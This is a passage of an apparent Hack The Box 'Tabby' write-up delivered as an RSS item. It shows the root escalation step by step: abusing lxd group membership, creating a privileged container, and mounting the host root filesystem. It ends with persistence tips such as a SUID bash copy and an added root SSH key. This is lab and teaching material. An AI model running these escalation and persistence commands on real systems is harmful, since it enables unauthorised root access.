</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-lxc">Abusing lxc</h4>
<p>I found out that user <code>ash</code> is a member of the <code>lxd</code> group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.</p>
<blockquote>
<p>It holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting <code>/</code> (root file system) to the container and interacting with it from inside the container as a privileged user.</p>
</blockquote>
<p>I&rsquo;ll use <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">this</a> article as reference.</p>
<p>First, I’ll create an alpine image on my attacking machine, which is Kali Linux.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ git clone https://github.com/saghul/lxd-alpine-builder
</span></span><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> lxd-alpine-builder
</span></span><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ ./build-alpine
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/99679b825f584f4aaefa3412876cd211.png" alt="99679b825f584f4aaefa3412876cd211"  /></div>
</p>
<p>Once it&rsquo;s done, there will be an image file called <code>alpine-v3.12-x86_64-blablabla</code>. In my case, it is <code>alpine-v3.12-x86_64-20201107_1900.tar.gz</code>. I&rsquo;ll send the image to Tabby via <code>scp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz  ash@10.10.10.194:/tmp
</span></span></code></pre></div><p>I&rsquo;ll initialize the lxd (storage pool, profile, etc..).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~$ lxd init
</span></span></code></pre></div><p>I&rsquo;ll import the image, and then initialize a container with <code>security.privileged</code> enabled from it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img
</span></span><span class="line"><span class="cl">ash@tabby:~$ lxc init iamf-img img-container -c security.privileged<span class="o">=</span><span class="nb">true</span>
</span></span></code></pre></div><p>Next, I&rsquo;ll mount the root file system of the host to the container at <code>/mnt/root</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~$ lxc config device add img-container iamf-test disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root
</span></span><span class="line"><span class="cl">Device iamf-test added to img-container
</span></span></code></pre></div><p>After that, I&rsquo;ll start the container. I can confirm it is running using <code>lxc ls</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ lxc start img-container
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003512685.png" alt="image-20210427003512685"  /></div>
</p>
<p>Now I can just interact with the container and grab the root flag on <code>/mnt/root/root/root.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~<span class="nv">$lxc</span> <span class="nb">exec</span> img-container /bin/sh
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003902623.png" alt="image-20210427003902623"  /></div>
</p>
<p>Modifications on <code>/mnt/root/</code> will also affect the root file system of the host. Other things I can do from the container is:</p>
<ul>
<li>Adding a persistent user via <code>/etc/passwd</code> (<code>/mnt/root/etc/passwd</code>)</li>
<li>Adding a SUID bash (<code>cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash</code>)</li>
<li>Enabling root login and put my SSH public key to the root <code>authorized_keys</code> file.</li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
